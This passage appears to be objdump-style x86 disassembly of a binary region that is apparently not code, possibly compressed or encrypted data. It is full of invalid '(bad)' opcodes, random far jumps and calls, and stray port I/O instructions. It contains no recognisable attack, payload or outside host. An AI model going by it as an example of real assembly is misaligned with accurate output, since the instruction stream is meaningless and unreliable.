  40b0f9:	add    DWORD PTR [edx-0x5b],eax
  40b0fc:	adc    eax,0x8a12bee7
  40b101:	cwde   
  40b102:	jne    0x40b0f5
  40b104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b105:	xor    eax,0x3fa33549
  40b10a:	mov    ebp,0x37e00197
  40b10f:	fs or  ebp,esi
  40b112:	cmp    al,BYTE PTR [eax+0x1f]
  40b115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b116:	int3   
  40b117:	pop    esp
  40b118:	nop
  40b119:	inc    esp
  40b11a:	and    eax,0x13b0e845
  40b11f:	cmp    DWORD PTR [edx],ebp
  40b121:	jo     0x40b190
  40b123:	xor    al,0x7f
  40b125:	clc    
  40b126:	mov    ebx,0xba0aa426
  40b12b:	aaa    
  40b12c:	cmp    DWORD PTR [ebx],esp
  40b12e:	or     BYTE PTR [ecx-0x478f31ac],cl
  40b134:	inc    esp
  40b135:	(bad)  
  40b136:	gs push ebp
  40b138:	enter  0xfddf,0x95
  40b13c:	jecxz  0x40b0bf
  40b13e:	jp     0x40b153
  40b140:	push   edi
  40b141:	sbb    BYTE PTR [edx+0x75],dh
  40b144:	fwait
  40b145:	jl     0x40b1a1
  40b147:	fist   DWORD PTR [edi+0x75]
  40b14a:	es call 0xf9266271
  40b150:	mov    ds:0xa5d0c8a8,al
  40b155:	xlat   BYTE PTR ds:[ebx]
  40b156:	mov    edi,0xe1d80a9c
  40b15b:	and    ah,BYTE PTR [edx-0x37]
  40b15e:	mov    edx,0x4ce9e489
  40b163:	sbb    eax,DWORD PTR [esi-0x23]
  40b166:	adc    ch,BYTE PTR [edi-0x9]
  40b169:	js     0x40b133
  40b16b:	or     al,0x82
  40b16d:	leave  
  40b16e:	and    DWORD PTR [edi-0x6b],esp
  40b171:	adc    eax,0x9c6e7c79
  40b176:	inc    edi
  40b177:	adc    eax,0xfd54595b
  40b17c:	xchg   esi,eax
  40b17d:	inc    edi
  40b17e:	ja     0x40b1a0
  40b180:	xchg   edi,eax
  40b181:	xchg   ecx,eax
  40b182:	jno    0x40b1b8
  40b184:	pop    es
  40b185:	icebp  
  40b186:	(bad)  
  40b187:	jmp    0x40b125
  40b189:	loope  0x40b19b
  40b18b:	test   al,0xa8
  40b18d:	into   
  40b18e:	cwde   
  40b18f:	and    esi,DWORD PTR [eax-0x41]
  40b192:	cmp    DWORD PTR [ebx+0x33],edi
  40b195:	test   al,0x90
  40b197:	outs   dx,BYTE PTR ds:[esi]
  40b198:	repz push 0x72421ed2
  40b19e:	sti    
  40b19f:	xchg   edx,eax
  40b1a0:	or     eax,0x7ef6c21e
  40b1a6:	fs mov ebx,0x9c27419d
  40b1ac:	mov    ebp,0xb929b5a2
  40b1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b2:	xchg   ecx,eax
  40b1b3:	lds    edi,FWORD PTR [ebp+0x24]
  40b1b6:	in     al,0xbf
  40b1b8:	les    eax,FWORD PTR [si-0x5a84]
  40b1bd:	mov    dh,0x9c
  40b1bf:	push   eax
  40b1c0:	xlat   BYTE PTR ds:[ebx]
  40b1c1:	neg    BYTE PTR [edi+0x3a3242e0]
  40b1c7:	cdq    
  40b1c8:	xor    DWORD PTR [edi],esi
  40b1ca:	imul   ebx,DWORD PTR [ecx+edi*1-0x17fb3f4],0xffffffee
  40b1d2:	or     eax,DWORD PTR cs:[eax-0x39c60a6d]
  40b1d9:	mov    bh,0x50
  40b1db:	xchg   ebp,eax
  40b1dc:	mov    al,0xc7
  40b1de:	rol    BYTE PTR [edi+0x33],cl
  40b1e1:	cld    
  40b1e2:	or     DWORD PTR [edi+0x377dd92e],0x3867ed9e
  40b1ec:	inc    ecx
  40b1ed:	(bad)  
  40b1ee:	imul   edx,DWORD PTR [ebp+0x343396fc],0xffffffc0
  40b1f5:	std    
  40b1f6:	fdivr  st(4),st
  40b1f8:	aam    0x49
  40b1fa:	mov    cl,0xb5
  40b1fc:	aad    0x77
  40b1fe:	lahf   
  40b1ff:	mov    eax,ds:0xd73f0d54
  40b204:	mov    eax,0xaf12e068
  40b209:	push   ebp
  40b20a:	push   es
  40b20b:	or     dh,ah
  40b20d:	in     al,dx
  40b20e:	mov    ah,0x5d
  40b210:	or     ebx,DWORD PTR [edx-0x39da8e9a]
  40b216:	pop    edx
  40b217:	test   eax,0xe7815ad7
  40b21c:	sbb    DWORD PTR [ebp+0x44c889a7],edx
  40b222:	rcl    BYTE PTR [esi],1
  40b224:	fwait
  40b225:	xchg   DWORD PTR [edi-0x3e43a716],ebx
  40b22b:	and    ch,BYTE PTR [esi+0x48]
  40b22e:	push   ss
  40b22f:	(bad)  
  40b230:	js     0x40b275
  40b232:	xchg   edi,eax
  40b233:	mov    ds:0x158851be,eax
  40b238:	sbb    dl,al
  40b23a:	push   ecx
  40b23b:	mov    BYTE PTR [ecx+0x6a0aa478],cl
  40b241:	and    bl,BYTE PTR [edx]
  40b243:	cld    
  40b244:	lds    eax,FWORD PTR [eax+0x9c73c1a]
  40b24a:	jp     0x40b28a
  40b24c:	jb     0x40b239
  40b24e:	adc    al,0xbf
  40b250:	pop    ebp
  40b251:	ret    
  40b252:	xchg   edi,eax
  40b253:	adc    ah,cl
  40b255:	jmp    0x26014246
  40b25a:	shl    BYTE PTR [ebp+0x3c],0x19
  40b25e:	push   ss
  40b25f:	je     0x40b2bc
  40b261:	sar    DWORD PTR [eax-0x305119a2],cl
  40b267:	sbb    al,0x82
  40b269:	dec    esp
  40b26a:	dec    edi
  40b26b:	pop    ebx
  40b26c:	mov    ds:0x4ee2f20f,al
  40b271:	dec    ebp
  40b272:	sbb    ah,cl
  40b274:	dec    ebp
  40b275:	xor    bl,dh
  40b277:	lock fwait
  40b279:	lods   al,BYTE PTR ds:[esi]
  40b27a:	xacquire xchg BYTE PTR [edi-0x25d2584a],bl
  40b281:	push   esi
  40b282:	cmp    esi,DWORD PTR [eax-0x2f6117dd]
  40b288:	xchg   edi,eax
  40b289:	xor    al,0x4e
  40b28b:	js     0x40b214
  40b28d:	fnstenv [esi+0x31]
  40b290:	gs pop ebx
  40b292:	mov    eax,0x11abf963
  40b297:	mov    ch,0x62
  40b299:	stos   DWORD PTR es:[edi],eax
  40b29a:	xchg   edi,eax
  40b29b:	xor    BYTE PTR [esi],bl
  40b29d:	sbb    BYTE PTR [esi],ah
  40b29f:	test   DWORD PTR [ebx-0x7a89f9a3],ebp
  40b2a5:	inc    esp
  40b2a6:	dec    edx
  40b2a7:	inc    edx
  40b2a8:	loopne 0x40b24c
  40b2aa:	and    al,bl
  40b2ac:	in     al,0xe4
  40b2ae:	retf   
  40b2af:	adc    DWORD PTR [edx+0x5d],0xa3c5ad8a
  40b2b6:	mov    ecx,0xc9a31c00
  40b2bb:	dec    eax
  40b2bc:	pushf  
  40b2bd:	or     BYTE PTR [ebp-0x136dcca],0x6c
  40b2c4:	jp     0x40b28d
  40b2c6:	cmp    DWORD PTR [esi-0x6aa46e2e],ebx
  40b2cc:	adc    eax,0x9684f044
  40b2d1:	sub    dl,BYTE PTR [ecx-0x2e79665]
  40b2d7:	mov    DWORD PTR [ebx+0x52],ecx
  40b2da:	test   eax,0x4be85105
  40b2df:	sub    dl,ch
  40b2e1:	outs   dx,DWORD PTR ds:[esi]
  40b2e2:	sub    DWORD PTR [edi-0x36],0x89376318
  40b2e9:	int    0x74
  40b2eb:	mov    esi,0x8cf1dcd3
  40b2f0:	stos   DWORD PTR es:[edi],eax
  40b2f1:	bnd jne 0x40b356
  40b2f4:	mov    eax,0x48014a57
  40b2f9:	sub    DWORD PTR [ebx-0x65d0ec54],ecx
  40b2ff:	mov    esp,0x137eb1f8
  40b304:	mov    bh,0x76
  40b306:	cli    
  40b307:	pop    ds
  40b308:	dec    esi
  40b309:	xor    dl,BYTE PTR ds:0x71b77e4f
  40b30f:	mov    al,0xcb
  40b311:	enter  0xca17,0x7f
  40b315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b317:	xor    eax,0x334f572d
  40b31c:	pop    ds
  40b31d:	je     0x40b35d
  40b31f:	rcl    DWORD PTR [edx-0x12738c5a],1
  40b325:	pop    ecx
  40b326:	lods   al,BYTE PTR ds:[esi]
  40b327:	addr16 pop eax
  40b329:	inc    ecx
  40b32a:	jmp    0x9d60:0x29e66493
  40b331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b332:	fcmovb st,st(1)
  40b334:	mov    DWORD PTR [edx+eax*1-0x4b],0xd544dfdd
  40b33c:	or     al,0xc3
  40b33e:	aam    0xbe
  40b340:	retf   0x6921
  40b343:	retf   0x47b0
  40b346:	mov    ecx,0xb536387d
  40b34b:	in     al,dx
  40b34c:	imul   ebp,DWORD PTR [edx-0x2a690c21],0xffffffaf
  40b353:	stos   BYTE PTR es:[edi],al
  40b354:	inc    ebp
  40b355:	xchg   ebp,eax
  40b356:	xor    al,0x8
  40b358:	mov    cl,0xbe
  40b35a:	fcmovnbe st,st(0)
  40b35c:	stos   BYTE PTR es:[edi],al
  40b35d:	or     bl,BYTE PTR [ecx+edx*1+0x2b0523ff]
  40b364:	outs   dx,BYTE PTR ds:[esi]
  40b365:	push   0xfffffff1
  40b367:	fild   QWORD PTR [eax-0x69]
  40b36a:	test   DWORD PTR [ecx-0x34d4e646],0xd3f3c0ff
  40b374:	lds    esi,FWORD PTR [eax]
  40b376:	popa   
  40b377:	(bad)  
  40b379:	int    0x5e
  40b37b:	pop    edi
  40b37c:	jge    0x40b338
  40b37e:	outs   dx,BYTE PTR ds:[esi]
  40b37f:	in     eax,dx
  40b380:	jnp    0x40b365
  40b382:	jns    0x40b376
  40b384:	lds    ecx,FWORD PTR [edx-0x58]
  40b387:	ror    DWORD PTR ds:0x118d487a,1
  40b38d:	test   DWORD PTR [eax+0x784415b5],esp
  40b393:	inc    ebp
  40b394:	mov    al,ds:0x65185479
  40b399:	xchg   esp,eax
  40b39a:	test   BYTE PTR [ebx],al
  40b39c:	fild   QWORD PTR [esi+ebx*4+0x4bae845e]
  40b3a3:	leave  
  40b3a4:	push   DWORD PTR [ebp-0xd974212]
  40b3aa:	cmp    BYTE PTR [ecx],0xfe
  40b3ad:	cdq    
  40b3ae:	inc    edi
  40b3af:	xchg   DWORD PTR [eax],edx
  40b3b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b2:	out    dx,al
  40b3b3:	push   esi
  40b3b4:	pop    esp
  40b3b5:	mov    ds:0x3a61caa8,al
  40b3ba:	test   DWORD PTR [ebp+0x75],edi
  40b3bd:	cmp    dl,ch
  40b3bf:	inc    ecx
  40b3c0:	xchg   bh,bl
  40b3c2:	xor    eax,0xfea1fa6
  40b3c7:	mov    DWORD PTR [esi],ebp
  40b3c9:	jl     0x40b3d7
  40b3cb:	(bad)  
  40b3cc:	iret   
  40b3cd:	das    
  40b3ce:	ret    
  40b3cf:	pop    edi
  40b3d0:	out    0xb1,eax
  40b3d2:	out    dx,eax
  40b3d3:	enter  0x98a5,0x8e
  40b3d7:	push   ss
  40b3d8:	push   ss
  40b3d9:	bound  edx,QWORD PTR [ebp+0x79]
  40b3dc:	loopne 0x40b414
  40b3de:	sbb    esi,ebx
  40b3e0:	stos   DWORD PTR es:[edi],eax
  40b3e1:	sbb    DWORD PTR [edx-0x1f],ebp
  40b3e4:	sbb    BYTE PTR [ebx],bl
  40b3e6:	in     eax,0x1e
  40b3e8:	out    0x2f,eax
  40b3ea:	(bad)
  40b3ed:	mov    esi,0x6ef45e26
  40b3f2:	repz push cs
  40b3f4:	or     al,0x3a
  40b3f6:	push   ds
  40b3f7:	test   BYTE PTR [ebx-0x67],bl
  40b3fa:	push   esi
  40b3fb:	shl    cl,1
  40b3fd:	sub    ecx,edi
  40b3ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b400:	jbe    0x40b448
  40b402:	pavgw  mm7,QWORD PTR [ebp-0x427c26fa]
  40b409:	popa   
  40b40a:	dec    ebx
  40b40b:	ja     0x40b3f1
  40b40d:	pop    esi
  40b40e:	es loope 0x40b479
  40b411:	add    dh,BYTE PTR [ecx+0x6e]
  40b414:	cwde   
  40b415:	adc    eax,0xbe3c641b
  40b41a:	sbb    dh,BYTE PTR [esi]
  40b41c:	xchg   ebp,eax
  40b41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b41e:	adc    eax,0x8a576492
  40b423:	(bad)  
  40b424:	leave  
  40b425:	adc    DWORD PTR es:[edi],eax
  40b428:	repz push eax
  40b42a:	dec    esi
  40b42b:	cwde   
  40b42c:	adc    DWORD PTR [edx+0x44],0xffffffc9
  40b430:	xor    al,0x17
  40b432:	push   cs
  40b433:	(bad)  
  40b434:	jne    0x40b400
  40b436:	ret    0x8bc
  40b439:	dec    esi
  40b43a:	jl     0x40b41a
  40b43c:	adc    BYTE PTR [edx+0x2b21bdeb],bh
  40b442:	or     esi,edi
  40b444:	stos   BYTE PTR es:[edi],al
  40b445:	mov    al,BYTE PTR [edx-0x12]
  40b448:	sti    
  40b449:	out    dx,al
  40b44a:	in     al,dx
  40b44b:	iret   
  40b44c:	sub    bh,al
  40b44e:	lods   al,BYTE PTR ds:[esi]
  40b44f:	jae    0x40b3e8
  40b451:	popf   
  40b452:	xor    ah,dh
  40b454:	popa   
  40b455:	or     al,0xd0
  40b457:	dec    edx
  40b458:	pop    eax
  40b459:	sbb    BYTE PTR cs:[eax],al
  40b45c:	mov    bl,0xd6
  40b45e:	pop    es
  40b45f:	xor    eax,0x1c305890
  40b464:	cs pusha 
  40b466:	dec    edx
  40b467:	loop   0x40b455
  40b469:	ss es cli 
  40b46c:	mov    eax,0x5f5d9596
  40b471:	pusha  
  40b472:	and    eax,0x7d8978e0
  40b477:	and    eax,0x852b5dad
  40b47c:	les    esp,FWORD PTR [ebp-0x4ea43b8d]
  40b482:	out    dx,al
  40b483:	xor    al,ch
  40b485:	add    ch,BYTE PTR [edi]
  40b487:	loop   0x40b4b2
  40b489:	adc    eax,0x3700a697
  40b48e:	aad    0xe4
  40b490:	aas    
  40b491:	scas   al,BYTE PTR es:[edi]
  40b492:	mov    ebx,0xe907acb6
  40b497:	pop    ecx
  40b498:	scas   eax,DWORD PTR es:[edi]
  40b499:	out    0x34,al
  40b49b:	pop    esp
  40b49c:	push   esp
  40b49d:	sti    
  40b49e:	fadd   st(6),st
  40b4a0:	idiv   DWORD PTR [ecx]
  40b4a2:	push   0x46
  40b4a4:	outs   dx,BYTE PTR ds:[esi]
  40b4a5:	cmp    ecx,DWORD PTR [ecx+0x6]
  40b4a8:	and    al,0x31
  40b4aa:	xchg   edx,eax
  40b4ab:	div    BYTE PTR [ebp+0x3f]
  40b4ae:	inc    edx
  40b4af:	call   0x5561:0x4bc410a7
  40b4b6:	jge    0x40b4e6
  40b4b8:	mov    BYTE PTR [eax],dl
  40b4ba:	jmp    0x6750:0x8884bbff
  40b4c1:	ficomp DWORD PTR [edi+0x32]
  40b4c4:	lods   eax,DWORD PTR ds:[esi]
  40b4c5:	scas   al,BYTE PTR es:[edi]
  40b4c6:	pop    esp
  40b4c7:	pop    ebx
  40b4c8:	in     eax,dx
  40b4c9:	clc    
  40b4ca:	jb     0x40b49c
  40b4cc:	add    al,0x8b
  40b4ce:	jnp    0x40b536
  40b4d0:	data16 and BYTE PTR [esi-0x6],bl
  40b4d4:	cmp    DWORD PTR [ecx-0x66],esp
  40b4d7:	sbb    dh,BYTE PTR [ebx+0x1bdc0a68]
  40b4dd:	inc    eax
  40b4de:	inc    BYTE PTR [ebx+0x6c2adff5]
  40b4e4:	imul   dh
  40b4e6:	cmp    edx,DWORD PTR [ecx+ebx*8-0x4e]
  40b4ea:	bound  eax,QWORD PTR fs:[esi]
  40b4ed:	fiadd  DWORD PTR [esi+edx*1+0x6006a16]
  40b4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4f5:	call   0xdde7598e
  40b4fa:	out    dx,al
  40b4fb:	popf   
  40b4fc:	mov    edi,0x31f1910f
  40b501:	push   0x52
  40b503:	out    dx,eax
  40b504:	mov    bl,ch
  40b506:	sub    al,0x65
  40b508:	jno    0x40b50f
  40b50a:	in     eax,dx
  40b50b:	add    DWORD PTR [ecx+0x30],esi
  40b50e:	jmp    0x40b4c6
  40b510:	mov    cl,0x7b
  40b512:	or     edx,edx
  40b514:	add    bh,dl
  40b516:	or     BYTE PTR [ebx-0x7c16f4f3],al
  40b51c:	sbb    DWORD PTR [ebx],edx
  40b51e:	cmp    BYTE PTR [ebx+0x52],dh
  40b521:	or     BYTE PTR [eax],dh
  40b523:	add    eax,0x95901d02
  40b528:	mov    esp,ds
  40b52a:	out    dx,eax
  40b52b:	test   eax,0xe79a2b83
  40b530:	xchg   DWORD PTR [esp+edi*1+0x163292df],ebx
  40b537:	and    ecx,DWORD PTR ss:[edi]
  40b53a:	mov    ah,0xe9
  40b53c:	mov    dh,0xfc
  40b53e:	pusha  
  40b53f:	shr    BYTE PTR [edi],0x32
  40b542:	je     0x40b5b2
  40b544:	sbb    al,0x70
  40b546:	ja     0x40b5bb
  40b548:	test   DWORD PTR [edi-0x2e],ebp
  40b54b:	test   DWORD PTR [ebx],esi
  40b54d:	jae    0x40b4f1
  40b54f:	mov    eax,ds:0x9a541381
  40b554:	jbe    0x40b556
  40b556:	cwde   
  40b557:	xlat   BYTE PTR ds:[ebx]
  40b558:	adc    DWORD PTR [edi-0x30b1c41d],ecx
  40b55e:	sub    DWORD PTR [edi-0x2a4bcc5f],0x20cd031
  40b568:	out    dx,eax
  40b569:	retf   0x6e4f
  40b56c:	cmp    DWORD PTR [edi],ecx
  40b56e:	aaa    
  40b56f:	add    ecx,DWORD PTR [ebp-0x4a9b8249]
  40b575:	sbb    eax,0xd0dce4d
  40b57a:	inc    edi
  40b57b:	enter  0xf82b,0xef
  40b57f:	and    BYTE PTR [esi],0xd8
  40b582:	sub    DWORD PTR [ebp+0x29aa3972],edx
  40b588:	mov    eax,esi
  40b58a:	imul   ecx,DWORD PTR ds:0xeddc0435,0xfffffff7
  40b591:	fmul   st,st(7)
  40b593:	sbb    DWORD PTR [eax-0x4f],ebp
  40b596:	lahf   
  40b597:	sub    al,0x2a
  40b599:	adc    DWORD PTR [edi+0x71],esi
  40b59c:	enter  0xcd66,0x2d
  40b5a0:	(bad)  
  40b5a1:	mov    cs,WORD PTR [edx]
  40b5a3:	ds inc edi
  40b5a5:	loop   0x40b595
  40b5a7:	push   ebx
  40b5a8:	loope  0x40b5f2
  40b5aa:	and    eax,0x50ffc9c5
  40b5af:	(bad)  [ebx]
  40b5b2:	xchg   ebx,eax
  40b5b3:	(bad)  
  40b5b4:	stc    
  40b5b5:	lea    ebx,[edx-0x7686f5b4]
  40b5bb:	data16 mov al,0x43
  40b5be:	stos   BYTE PTR es:[edi],al
  40b5bf:	xor    bl,BYTE PTR [eax+0x4415579f]
  40b5c5:	cmc    
  40b5c6:	int    0x9d
  40b5c8:	sbb    edx,DWORD PTR [ecx]
  40b5ca:	jns    0x40b61b
  40b5cc:	ins    BYTE PTR es:[edi],dx
  40b5cd:	aas    
  40b5ce:	xchg   edi,eax
  40b5cf:	mov    bl,0xa9
  40b5d1:	sar    ecx,cl
  40b5d3:	cmp    ebx,DWORD PTR [esi-0x418c89b9]
  40b5d9:	add    al,0xf9
  40b5db:	iret   
  40b5dc:	ficom  DWORD PTR [edi]
  40b5de:	add    DWORD PTR [ebx+0x11],esi
  40b5e1:	xchg   esp,eax
  40b5e2:	push   cs
  40b5e3:	mov    ebx,0x1ad63e2f
  40b5e8:	(bad)  
  40b5e9:	lock outs dx,DWORD PTR ds:[esi]
  40b5eb:	dec    edx
  40b5ec:	leave  
  40b5ed:	lock push esp
  40b5ef:	inc    ecx
  40b5f0:	call   0xe37f0910
  40b5f5:	jb     0x40b5dc
  40b5f7:	(bad)  
  40b5f8:	cmp    cl,bl
  40b5fa:	mov    ecx,0x8ecb4574
  40b5ff:	pop    eax
  40b600:	add    dl,BYTE PTR [eax+0x2e]
  40b603:	pop    ds
  40b604:	sub    eax,0xa3932364
  40b609:	aam    0xba
  40b60b:	mov    ds:0xbffe8ca7,eax
  40b610:	mov    dh,0xd5
  40b612:	loopne 0x40b63f
  40b614:	push   edx
  40b615:	rol    bh,cl
  40b617:	mov    cl,0xa5
  40b619:	jecxz  0x40b5e0
  40b61b:	jnp    0x40b5ab
  40b61d:	dec    ebx
  40b61e:	js     0x40b610
  40b620:	into   
  40b621:	fwait
  40b622:	iret   
  40b623:	jmp    0xba157394
  40b628:	xchg   dl,bl
  40b62a:	cli    
  40b62b:	into   
  40b62c:	xchg   ebx,eax
  40b62d:	scas   al,BYTE PTR es:[edi]
  40b62e:	or     BYTE PTR [ebp+eiz*4+0x75],dh
  40b632:	xchg   ecx,eax
  40b633:	test   DWORD PTR [eax],eax
  40b635:	mov    BYTE PTR [esi-0x51],dh
  40b638:	push   esp
  40b639:	(bad)  
  40b63b:	in     eax,0x35
  40b63d:	mov    bh,0x99
  40b63f:	and    DWORD PTR [ebp+0x56],0xffffffdb
  40b643:	enter  0x23d4,0x58
  40b647:	cmp    esi,eax
  40b649:	dec    edx
  40b64a:	sub    BYTE PTR [esi],cl
  40b64c:	push   cs
  40b64d:	pop    ss
  40b64e:	mov    eax,0x95e5aef6
  40b653:	xchg   esi,eax
  40b654:	call   0x2ecf2a05
  40b659:	ins    BYTE PTR es:[edi],dx
  40b65a:	jo     0x40b613
  40b65c:	arpl   WORD PTR [esi+0x624e1b58],cx
  40b662:	jecxz  0x40b6b4
  40b664:	cmp    ch,BYTE PTR [edx+0x2d1b447e]
  40b66a:	mov    eax,ds:0xa0ddc4a4
  40b66f:	cli    
  40b670:	shl    BYTE PTR [edi],0xf4
  40b673:	xor    al,0x31
  40b675:	das    
  40b676:	shl    BYTE PTR [edx],cl
  40b678:	fsubr  QWORD PTR [eax]
  40b67a:	xchg   esp,eax
  40b67b:	outs   dx,BYTE PTR ds:[esi]
  40b67c:	(bad)
  40b680:	or     cl,BYTE PTR [ebp+eiz*8+0x40]
  40b684:	jle    0x40b6d4
  40b686:	cmp    bl,BYTE PTR [edx+0x44]
  40b689:	jb     0x40b644
  40b68b:	mov    ecx,0x1faf4ebe
  40b690:	pop    esi
  40b691:	lea    ebp,[ebx-0x27aa997]
  40b697:	fs stos DWORD PTR es:[edi],eax
  40b699:	jne    0x40b6bc
  40b69b:	and    esp,DWORD PTR [esi+0x2]
  40b69e:	push   ebx
  40b69f:	test   eax,0x26b7b28e
  40b6a4:	dec    ecx
  40b6a5:	mov    eax,ds:0x981a5bad
  40b6aa:	fldcw  WORD PTR [ecx]
  40b6ac:	jmp    0x53fbdf96
  40b6b1:	lea    ebp,[edi+0x2d3b2416]
  40b6b7:	mov    DWORD PTR [edx-0x661f4a69],edx
  40b6bd:	hlt    
  40b6be:	pop    ds
  40b6bf:	push   ss
  40b6c0:	mov    ch,0x61
  40b6c2:	or     bh,dh
  40b6c4:	lods   al,BYTE PTR ds:[esi]
  40b6c5:	pop    edi
  40b6c6:	cwde   
  40b6c7:	sti    
  40b6c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6c9:	daa    
  40b6ca:	push   edx
  40b6cb:	jp     0x40b6f8
  40b6cd:	xchg   ecx,eax
  40b6ce:	sbb    DWORD PTR [edx],eax
  40b6d0:	or     esi,DWORD PTR [ebx+0x3f]
  40b6d3:	ss dec esi
  40b6d5:	mov    cl,0xf8
  40b6d7:	sbb    al,0x12
  40b6d9:	pop    ss
  40b6da:	paddw  mm3,QWORD PTR [eax+0x482995d5]
  40b6e1:	(bad)  
  40b6e2:	bound  ebx,QWORD PTR [esi-0x4]
  40b6e5:	ss test esi,esp
  40b6e8:	mov    edi,DWORD PTR [edx]
  40b6ea:	or     eax,0x518b9398
  40b6ef:	mov    ds:0x7bcdb1c4,eax
  40b6f4:	leave  
  40b6f5:	clc    
  40b6f6:	adc    al,0x39
  40b6f8:	mov    esi,0x4e7d73b0
  40b6fd:	iret   
  40b6fe:	test   BYTE PTR [eax+0x0],ah
  40b701:	das    
  40b702:	scas   al,BYTE PTR es:[edi]
  40b703:	imul   ebp,edx,0xffffffa6
  40b706:	imul   eax,DWORD PTR [eax-0x6b56a6a],0xffffffb5
  40b70d:	sbb    al,0x63
  40b70f:	rol    BYTE PTR [ecx+0x114f088],cl
  40b715:	(bad)
  40b718:	jo     0x40b6bf
  40b71a:	ss (bad) 
  40b71c:	push   0xdc22c3f7
  40b721:	lahf   
  40b722:	sbb    BYTE PTR [edi+eax*1],bl
  40b725:	lahf   
  40b726:	sbb    dl,BYTE PTR [esi-0x5b]
  40b729:	inc    BYTE PTR [edi+eiz*1+0x3f]
  40b72d:	call   0x5b41e949
  40b732:	and    eax,0xd4b45a8f
  40b737:	pop    esp
  40b738:	xchg   esp,eax
  40b739:	adc    bl,BYTE PTR [ecx]
  40b73b:	sbb    esp,DWORD PTR [esi]
  40b73d:	sbb    eax,0x573dfe5a
  40b742:	push   esi
  40b743:	adc    esp,DWORD PTR [ebp-0x10]
  40b746:	mov    ah,bh
  40b748:	cmp    eax,0x5576a766
  40b74d:	imul   esp,DWORD PTR [edx+eax*2-0x35],0x8406caf2
  40b755:	mov    ds:0xe519712d,eax
  40b75a:	loope  0x40b76f
  40b75c:	add    BYTE PTR [ebx+0x4f92093a],ah
  40b762:	pop    ebx
  40b763:	pop    es
  40b764:	push   ds
  40b765:	call   0x2fc50c97
  40b76a:	iret   
  40b76b:	add    bl,BYTE PTR [ecx]
  40b76d:	sbb    DWORD PTR [edx+0xd],0xc77f4aa0
  40b774:	jmp    0x40b76b
  40b776:	sub    BYTE PTR [esi],al
  40b778:	inc    ebx
  40b779:	repz dec eax
  40b77b:	icebp  
  40b77c:	and    al,0x1a
  40b77e:	call   0x2a7e1db
  40b783:	dec    ebp
  40b784:	pop    ecx
  40b785:	sti    
  40b786:	mov    DWORD PTR [edi],edi
  40b788:	test   BYTE PTR [edi+edx*1],0x9
  40b78c:	adc    dh,ah
  40b78e:	imul   edi,DWORD PTR [edx-0x4cb88c],0x20
  40b795:	push   ss
  40b796:	das    
  40b797:	mov    cl,0x4
  40b799:	mov    bl,0xd1
  40b79b:	pop    edi
  40b79c:	mov    edi,0x86724876
  40b7a1:	clc    
  40b7a2:	sti    
  40b7a3:	push   0x48
  40b7a5:	jmp    eax
  40b7a7:	or     edx,ecx
  40b7a9:	imul   edx,DWORD PTR [ebx-0x3b202614],0x67992fc9
  40b7b3:	xor    BYTE PTR [ecx+0x2f],cl
  40b7b6:	out    dx,al
  40b7b7:	mov    ch,0xd2
  40b7b9:	cmp    esp,edx
  40b7bb:	out    0x4a,eax
  40b7bd:	in     eax,dx
  40b7be:	int    0x2f
  40b7c0:	int    0xcb
  40b7c2:	adc    esi,esp
  40b7c4:	cmp    dl,BYTE PTR [ebx-0x10064cfd]
  40b7ca:	inc    ecx
  40b7cb:	stos   DWORD PTR es:[edi],eax
  40b7cc:	jo     0x40b833
  40b7ce:	mov    dl,0x0
  40b7d0:	es popf 
  40b7d2:	into   
  40b7d3:	iret   
  40b7d4:	(bad)
  40b7d7:	in     al,0x3c
  40b7d9:	cwde   
  40b7da:	push   DWORD PTR [ebp-0x3f7f0519]
  40b7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7e1:	stc    
  40b7e2:	inc    edi
  40b7e3:	inc    ebp
  40b7e4:	dec    eax
  40b7e5:	shr    DWORD PTR [eax],1
  40b7e7:	not    bh
  40b7e9:	pop    ebx
  40b7ea:	xor    al,BYTE PTR cs:[edi]
  40b7ed:	loop   0x40b80b
  40b7ef:	cs push esi
  40b7f1:	lds    ebp,FWORD PTR ss:[ebp-0x27f26270]
  40b7f8:	jmp    0x40b815
  40b7fa:	jns    0x40b7f3
  40b7fc:	and    BYTE PTR [eax],cl
  40b7fe:	mov    al,ds:0xb212a577
  40b803:	out    dx,eax
  40b804:	push   cs
  40b805:	or     bl,BYTE PTR [eax]
  40b807:	popf   
  40b808:	inc    esp
  40b809:	ret    
  40b80a:	aam    0xa7
  40b80c:	fisub  WORD PTR [ecx+0x45b8d23c]
  40b812:	inc    eax
  40b813:	ds jg  0x40b842
  40b816:	lods   al,BYTE PTR ds:[esi]
  40b817:	pop    ss
  40b818:	or     BYTE PTR fs:[ebx-0x4283ef5a],bh
  40b81f:	xchg   ebp,eax
  40b820:	jnp    0x40b7a6
  40b822:	call   0xd585:0xb8f3c92c
  40b829:	cmp    ah,BYTE PTR [esp+edi*8]
  40b82c:	pop    ebx
  40b82d:	jae    0x40b84e
  40b82f:	mov    esi,0x3832d681
  40b834:	(bad)  
  40b835:	nop
  40b836:	daa    
  40b837:	lods   al,BYTE PTR ds:[esi]
  40b838:	cwde   
  40b839:	jo     0x40b885
  40b83b:	mov    edx,0x16fd44c3
  40b840:	dec    ebp
  40b841:	shr    DWORD PTR [ebp-0x469e1f96],0x60
  40b848:	and    al,0x9a
  40b84a:	mov    al,ds:0xfcdb31e8
  40b84f:	jecxz  0x40b8ac
  40b851:	imul   ecx,ebx,0x29efd06c
  40b857:	jnp    0x40b89c
  40b859:	or     bl,cl
  40b85b:	lods   eax,DWORD PTR ds:[esi]
  40b85c:	dec    esp
  40b85d:	mov    cl,0x42
  40b85f:	sahf   
  40b860:	xor    al,0x4d
  40b862:	mov    edx,0xdf55641f
  40b867:	xchg   ecx,eax
  40b868:	in     eax,0x10
  40b86a:	jmp    0x40b821
  40b86c:	jns    0x40b828
  40b86e:	xor    ah,BYTE PTR [edx+0x6d]
  40b871:	jmp    0xd012:0x8c216f2
